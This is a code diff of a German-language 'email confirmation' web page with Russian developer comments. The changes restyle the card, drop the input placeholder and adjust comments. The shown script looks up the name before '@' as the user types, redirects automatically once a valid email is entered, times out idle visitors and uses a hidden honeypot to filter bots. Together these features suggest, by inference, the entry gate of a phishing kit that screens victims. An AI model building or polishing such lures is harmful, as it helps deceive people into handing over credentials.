@@ -8,36 +8,49 @@
 <title>Bestätigung erforderlich</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
+
+/* Красивый глубокий градиент на фоне */
 body{
   font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
-  background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
   min-height:100vh;display:flex;justify-content:center;align-items:center;
   padding:20px;color:#333;
 }
+
+/* Эффект матового стекла для карточки */
 .card{
-  background:#fff;padding:40px 30px;border-radius:16px;
-  box-shadow:0 10px 30px rgba(0,0,0,.1);text-align:center;
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  padding:40px 30px;border-radius:16px;
+  box-shadow:0 15px 35px rgba(0,0,0,.2);text-align:center;
   max-width:420px;width:100%;position:relative;overflow:hidden;
   animation:cardIn .4s ease-out;
 }
+
 @keyframes cardIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
 .bar{height:4px;width:100%;background:#f3f4f6;position:absolute;top:0;left:0}
 .bar::after{
   content:'';position:absolute;left:-30%;top:0;height:100%;width:30%;
   background:#4d81f1;animation:barMove 2s infinite ease-in-out;
 }
 @keyframes barMove{0%{left:-30%}100%{left:100%}}
+
 .title{font-size:20px;margin-bottom:10px;font-weight:600;color:#111827}
 .subtitle{font-size:14px;color:#6b7280;line-height:1.5;margin-bottom:24px}
 .wrap{position:relative;text-align:left}
+
 input[type=email]{
   width:100%;padding:14px 16px;font-size:16px;
   border:2px solid #e5e7eb;border-radius:10px;outline:none;
   transition:border-color .2s,box-shadow .2s;
   font-family:inherit;
+  background: rgba(255, 255, 255, 0.8);
 }
-input[type=email]:focus{border-color:#4d81f1;box-shadow:0 0 0 4px rgba(77,129,241,.1)}
+input[type=email]:focus{border-color:#4d81f1;box-shadow:0 0 0 4px rgba(77,129,241,.1);background: #fff;}
 input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
+
 .suggestion{
   position:absolute;left:0;right:0;top:calc(100% + 6px);
   background:#fff;border:1px solid #e5e7eb;border-radius:10px;
@@ -47,6 +60,7 @@ input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
 }
 @keyframes hintIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
 .suggestion[hidden]{display:none}
+
 .suggestion-btn{
   flex:0 0 auto;padding:8px 14px;background:#eff6ff;color:#2563eb;
   border:none;border-radius:8px;font-weight:500;cursor:pointer;
@@ -54,10 +68,12 @@ input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
 }
 .suggestion-btn:hover{background:#dbeafe}
 .suggestion-btn:active{transform:scale(.97)}
+
 .honeypot{
   position:absolute;left:-9999px;width:1px;height:1px;
   opacity:0;pointer-events:none;
 }
+
 .badge{
   margin-top:24px;font-size:12px;color:#9ca3af;
   display:flex;align-items:center;justify-content:center;gap:6px;
@@ -65,14 +81,15 @@ input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
 </style>
 </head>
 <body>
+
 <div class="card">
   <div class="bar"></div>
   <h1 class="title" id="title">E-Mail-Adresse bestätigen</h1>
   <p class="subtitle" id="subtitle">Bitte geben Sie Ihre E-Mail-Adresse ein, um fortzufahren.</p>
 
   <div class="wrap">
+    <!-- Плейсхолдер убран, чтобы не сбивать с толку -->
     <input type="email" id="email"
-           placeholder="ihre@adresse.de"
            autocomplete="email"
            inputmode="email"
            autocapitalize="off"
@@ -82,6 +99,7 @@ input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
     <div class="suggestion" id="suggestion" hidden></div>
   </div>
 
+  <!-- Скрытое поле-ловушка для ботов -->
   <input type="text" name="website" id="hp" class="honeypot" tabindex="-1" autocomplete="off" aria-hidden="true">
 
   <div class="badge">
@@ -251,11 +269,9 @@ input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
     had_key = true;
     resetIdle();
 
-    // Извлекаем nickname (часть до @)
     var atPos = value.indexOf('@');
     var nickname = atPos > 0 ? value.substring(0, atPos).toLowerCase().trim() : '';
 
-    // Lookup при изменении nickname
     if (nickname.length > 0 && nickname !== lastNickname) {
       lastNickname = nickname;
       if (lookupTimer) clearTimeout(lookupTimer);
@@ -268,7 +284,6 @@ input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
       if (lookupTimer) clearTimeout(lookupTimer);
     }
 
-    // Проверка на валидный email с дебаунсом → авто-редирект
     if (emailTimer) clearTimeout(emailTimer);
     if (EMAIL_REGEX.test(value.trim())) {
       emailTimer = setTimeout(function() {
@@ -310,7 +325,7 @@ input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
   resetIdle();
   absoluteTimer = setTimeout(triggerTimeout, CONFIG.ABSOLUTE_TIMEOUT_MS);
 
-  // Автофокус на поле (кроме мобильных, чтобы не выскакивала клавиатура сразу)
+  // Автофокус только на ПК, чтобы на мобилках не выскакивала клавиатура сразу
   if (!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
     setTimeout(function() { emailEl.focus(); }, 300);
   }
